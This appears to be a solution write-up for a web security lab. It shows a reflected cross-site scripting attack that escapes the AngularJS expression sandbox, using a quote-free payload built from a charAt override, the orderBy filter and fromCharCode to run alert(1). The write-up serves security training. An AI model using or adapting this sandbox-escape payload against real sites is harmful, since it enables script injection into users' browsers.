## Solution steps

- Enter any random string in the search box: `hello`
- View it's page source.
- Notice the script where your entered string is reflected:
  ```html
  <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
    $scope.query = {};
    var key = 'search';
    $scope.query[key] = 'hello';
    $scope.value = $parse(key)($scope.query);
  });</script>
- This is a small AngularJS app.
- It takes a key `'search'`, then puts `'hello'` into `$scope.query['search']`.
- Then it does this: `$scope.value = $parse(key)($scope.query);`
- Which gets the value of query.search and assigns it to value. So eventually, `{{value}}` gets replaced with whatever is in the search parameter.
- The result is displayed using `{{value}}`.
- If you input just: `?search=hello`, It becomes: `<h1>0 search results for hello</h1>`.
- And if you do: `?search=1+1`, It becomes: `<h1>0 search results for 1+1</h1>`. This shows that AngularJS is not evaluating the math expression.
- So instead, we have to craft a more complex payload that breaks the sandbox.
- Use this crafted payload in the URL: `?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

### How it Works

- No quotes allowed: The lab blocks strings like `"alert(1)"`, so we must avoid using quotes.
- `toString().constructor` -> This gives us access to the global Function constructor using a sneaky trick.
- `prototype.charAt = [].join` -> We overwrite the charAt function with `join()` to bypass Angular's sandbox filters.
- `[1] | orderBy: ...` -> We use AngularJS's orderBy filter to force an expression evaluation.
- `fromCharCode(...)` -> This generates a string using ASCII codes:
  - `120,61,97,108,101,114,116,40,49,41` becomes:
  - `x=alert(1)`
- That expression `(x=alert(1))` gets executed by AngularJS once sandbox is bypassed.
